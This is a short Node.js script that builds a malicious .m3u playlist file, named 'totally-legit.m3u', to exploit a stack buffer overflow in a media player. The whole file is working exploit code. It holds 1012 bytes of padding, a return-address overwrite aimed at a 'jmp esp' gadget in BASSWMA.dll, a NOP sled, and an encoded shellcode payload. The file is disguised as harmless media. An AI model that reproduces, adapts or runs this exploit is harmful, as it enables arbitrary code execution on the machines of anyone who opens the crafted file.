const fs = require('fs')
const fileName = 'totally-legit.m3u'
const stackSize = 1012
const addressSize = 4 // 4 bytes == 1 address
const nopsled = lenght => '\x90'.repeat(lenght) // 0xcc = nop
const payload = () => {
buf =  ""
buf += "\xbe\xac\xc0\x0e\x3b\xdb\xc7\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x59\x83\xc0\x04\x31\x70\x10\x03\x70\x10\x4e"
buf += "\x35\xf2\xd3\x01\xb6\x0b\x24\x7d\x86\xd9\x40\xf6\xba"
buf += "\xed\x03\x5a\x37\x87\xf1\xd1\x15\x83\x72\x97\xb1\xa4"
buf += "\x33\x1d\xe4\x8b\xc4\x90\x28\x47\x06\xb3\xd4\x9a\x5b"
buf += "\x13\xe4\x54\xae\x52\x21\x23\xc4\xbb\xff\x3f\x74\x53"
buf += "\x8b\x02\x45\x52\x5b\xd5\x3e\x14\x23\x5f\x80\xe0\x9f"
buf += "\x5e\xd1\x58\xab\x39\xf1\xd3\xe3\xa1\xf0\x30\x76\x18"
buf += "\x86\x8a\x30\x10\x53\x79\xc3\xf0\xad\x82\xf5\x3c\x0c"
buf += "\xb3\xfb\x10\x8e\x8c\x3c\x89\xe4\xe6\x3e\x34\xff\x3d"
buf += "\x3c\xe2\x8a\xa1\xe6\x61\x2c\x05\x16\xa5\xab\xce\x14"
buf += "\x02\xbf\x88\x38\x95\x6c\xa3\x45\x1e\x93\x63\xcc\x64"
buf += "\xb0\xa7\x94\x3f\xd9\xfe\x70\x91\xe6\xe0\xdd\x4e\x43"
buf += "\x6b\xcf\x99\xf3\x94\x0f\xa6\xa9\x02\xc3\x6b\x52\xd2"
buf += "\x4b\xfb\x21\xe0\xd4\x57\xae\x48\x9c\x71\x29\xd9\x8a"
buf += "\x81\xe5\x61\xda\x7f\x06\x91\xf2\xbb\x52\xc1\x6c\x6d"
buf += "\xdb\x8a\x6c\x92\x0e\x26\x67\x04\x71\x1e\xc5\x82\x19"
buf += "\x5c\x2a\x08\x51\xe9\xcc\x1e\x35\xb9\x40\xdf\xe5\x79"
buf += "\x31\xb7\xef\x76\x6e\xa7\x0f\x5d\x07\x42\xe0\x0b\x7f"
buf += "\xfb\x99\x16\x0b\x9a\x66\x8d\x71\x9c\xed\x27\x85\x53"
buf += "\x06\x42\x95\x84\x71\xac\x65\x55\x14\xac\x0f\x51\xbe"
buf += "\xfb\xa7\x5b\xe7\xcb\x67\xa3\xc2\x48\x6f\x5b\x93\x78"
buf += "\x1b\x6a\x01\xc4\x73\x93\xc5\xc4\x83\xc5\x8f\xc4\xeb"
buf += "\xb1\xeb\x97\x0e\xbe\x21\x84\x82\x2b\xca\xfc\x77\xfb"
buf += "\xa2\x02\xa1\xcb\x6c\xfd\x84\x4f\x6a\x01\x5a\x78\xd3"
buf += "\x69\xa4\x38\xe3\x69\xce\xb8\xb3\x01\x05\x96\x3c\xe1"
buf += "\xe6\x3d\x15\x69\x6c\xd0\xd7\x08\x71\xf9\xb6\x94\x72"
buf += "\x0e\x63\x27\x08\x7f\x94\xc8\xed\x69\xf1\xc9\xed\x95"
buf += "\x07\xf6\x3b\xac\x7d\x39\xf8\x8b\x8e\x0c\x5d\xbd\x04"
buf += "\x6e\xf1\xbd\x0c"
return buf
}
let buf = ''
buf += 'A'.repeat(stackSize) // overflow
// overrides EIP with Address :  0x1010539f => jmp esp
// found with immunity by issuing the command : !searchcode: jmp esp
// the address is on a PAGE_EXECUTE_READ at BASSWMA.dll
buf += "\x9f\x53\x10\x10"
buf += nopsled(addressSize*4) // just in case, not mandatory
buf += payload()
fs.writeFile(`./${fileName}`, buf, 'binary', () => console.log(`Done! > ${fileName}`))
